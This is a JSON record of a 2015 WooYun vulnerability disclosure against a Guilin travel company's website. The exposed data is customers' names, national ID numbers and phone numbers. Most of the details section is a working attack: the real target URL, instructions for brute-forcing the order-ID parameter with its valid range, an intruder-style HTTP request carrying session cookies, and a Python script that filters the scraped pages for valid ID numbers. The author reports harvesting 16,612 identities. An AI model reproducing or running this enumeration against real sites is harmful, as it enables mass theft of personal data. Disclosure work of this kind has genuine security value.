{"id": 27254, "wybug_id": "wooyun-2015-0126381", "wybug_title": "桂林市南北假日国际旅游有限责任公司泄漏几十万用户信息（姓名，身份证，手机）", "wybug_corp": "桂林市南北假日国际旅游有限责任公司", "wybug_author": "prolog", "wybug_date": "2015-07-13 10:29", "wybug_open_date": "2015-08-27 10:30", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "安全意识不足", "用户敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 桂林市南北假日国际旅游有限责任公司泄漏几十万用户信息（姓名，身份证，手机） 详细说明：  1.百度得到urlhttps://www.baidu.com/s?ie=UTF-8&wd=inurl%3Ahttp%3A//www.happytoo.cn/seller.line.confirm.html%3Foid=http://www.happytoo.cn/seller.line.confirm.html?oid=549821&mid=148885&cid=19679\n\n2.参数组成分析http://www.happytoo.cn/seller.line.confirm.html?oid=549445&mid=148885&cid=19679oid订单号mid不明cid不明oid范围从12035到688979，中间少部分无效，可以爆破的数据应该很大..由于是团队旅游，这个范围数据量应该有几十万..http://www.happytoo.cn/seller.line.confirm.html?oid=12035&mid=148885&cid=19679...http://www.happytoo.cn/seller.line.confirm.html?oid=688979&mid=148885&cid=19679以&mid=148885&cid=19679固定值进行爆破54XXXX中的0001-9999共5000组数据（经测试在这个范围oid是奇数才有效），保存进行文件处理，统计得到有效的姓名-身份证号16612个，部分还有手机号。\nGET /seller.line.confirm.html?oid=54§9445§&mid=148885&cid=19679 HTTP/1.1Host: www.happytoo.cnProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: www_happytoo_cn_web_siteid=6980bc28bb720960eadbecacb089c63dbcc04b5c%7E219; ltoken=2120f3e9c45e109d149093047466b030a8b61fe8%7E1436731333\n统计代码如下，对比有效和无效页面，得到特征进行过滤，只统计包含有效身份证号的\n\n\n#! /usr/bin/env python#coding=gbkimport os#客人名单的开始和结束begin='<td colspan=\"5\" style=\"padding:3pt 5pt; width:400pt; font-size:9pt;border-bottom:none!important;\">'end='</td>'count=0for i in open(r'e:\\asfaf').read().split(begin):    j=i.split(end)[0] #取到含0-多个客人名单的区段    if '(' in j and ')' in j:#身份证段一定有（）        for k in j.split('\\n'):#身份证段一定有-和()，有效的身份证中括号内为18位            if '(' in k and ')' in k and len(k[k.find('(')+1:k.find(')')])==18 and '-' in k:                count+=1                print kprint count\n   漏洞证明：  ...   修复方案：  ...   版权声明：转载请注明来源 prolog@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}